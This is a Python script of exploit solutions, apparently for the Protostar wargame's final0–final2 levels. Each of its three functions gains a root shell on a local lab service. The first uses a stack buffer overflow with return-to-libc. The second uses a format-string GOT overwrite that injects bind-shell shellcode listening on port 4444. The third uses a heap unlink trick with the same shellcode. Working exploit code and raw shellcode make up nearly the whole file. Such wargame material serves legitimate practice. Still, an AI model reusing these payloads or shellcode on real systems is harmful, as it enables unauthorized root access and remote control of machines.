import protopwn as p
import socket
import struct
import time

#-----------------------------------------------+
# pop a root shell with a stack buffer overflow |
#-----------------------------------------------+
def final0():
    name = "final0"
    p.start(name)
    path = p.PATH + name

    execve = struct.pack("I", 0x08048c0c)
    exit = struct.pack("I", 0x08048c9c)

    binsh = struct.pack("I", 0xb7e97000 + 1176511)

    padding = 511 * "A"
    padding += '\x00'
    padding += 20 * "B"

    payload = padding + execve + exit + binsh + '\x00' * 10

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2995))

    p.info("sending payload")
    s.send(payload+"\n")

    p.info("calling 'whoami'")
    s.send("whoami\n")
    out = s.recv(1024)

    if "root" in out:
        p.content(out)
        p.ok("solved !")
    else:
        p.err("failed")

    s.close()

#--------------------------------------+
# pop a root shell with format strings |
#--------------------------------------+
def final1():
    name = "final1"
    p.start(name)
    path = p.PATH + name

    syslog_got = struct.pack("I", 0x0804a11c)
    syslog_got_h = struct.pack("I", 0x0804a11e)

    shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
                "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
                "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
                "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
                "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
                "\x0b\xcd\x80"

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2994))

    payload =  "username X"
    payload += syslog_got
    payload += syslog_got_h
    payload += "aa"
    payload += shellcode 
    payload += "%64364x%15$n" 
    payload += "%50203x%16$n"
    payload += "\n"

    p.info("sending payload")
    s.sendall(payload)

    p.info("triggering payload")
    trigger = "login a\n"
    s.sendall(trigger)
    s.sendall(trigger)

    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell.connect(("localhost", 4444))

    p.info("calling 'whoami'")
    shell.sendall("whoami\n")
    out = shell.recv(1024)

    if "root" in out:
        p.content(out)
        p.ok("solved !")
    else:
        p.err("failed")

    s.close()
    shell.close()

#-------------------------------------------------+
# pop a root shell with old school unlink() trick |  
#-------------------------------------------------+
def final2():
    name = "final2"
    p.start(name)
    path = p.PATH + name

    shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
                "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
                "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
                "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
                "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
                "\x0b\xcd\x80"

    s = socket.socket()
    s.connect(("127.0.0.1",2993))

    chunk = "FSRD" 
    chunk += "\x90" * 4
    chunk += "\x68\x30\xe0\x04\x08\xc3"          
    chunk += "\x90" * (128 - 19 - len(shellcode)) 
    chunk += shellcode
    chunk += "\x90" * 4
    chunk += "/"

    p.info("sending chunk")
    s.sendall(chunk)

    fastbin_sz_1 = struct.pack("I", 0xfffffffe)
    fastbin_sz_2 = struct.pack("I", 0xfffffffc)
    write_got = struct.pack("I", 0x0804d410)
    shellcode_addr = struct.pack("I", 0x0804e010)

    chunk_hdr = fastbin_sz_1
    chunk_hdr += fastbin_sz_2
    chunk_hdr += write_got
    chunk_hdr += shellcode_addr

    chunk = "FSRD" 
    chunk += "ROOT"
    chunk += "A" * (128 - 9 - len(chunk_hdr))
    chunk += "/" 
    chunk += chunk_hdr

    p.info("sending chunk")
    s.sendall(chunk)

    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell.connect(("localhost", 4444))

    p.info("calling 'whoami'")
    shell.sendall("whoami\n")
    out = shell.recv(1024)

    if "root" in out:
        p.content(out)
        p.ok("solved !")
    else:
        p.err("failed")

    s.close()
    shell.close()

def final_solve():
    final0()
    time.sleep(1)
    final1()
    time.sleep(1)
    final2()
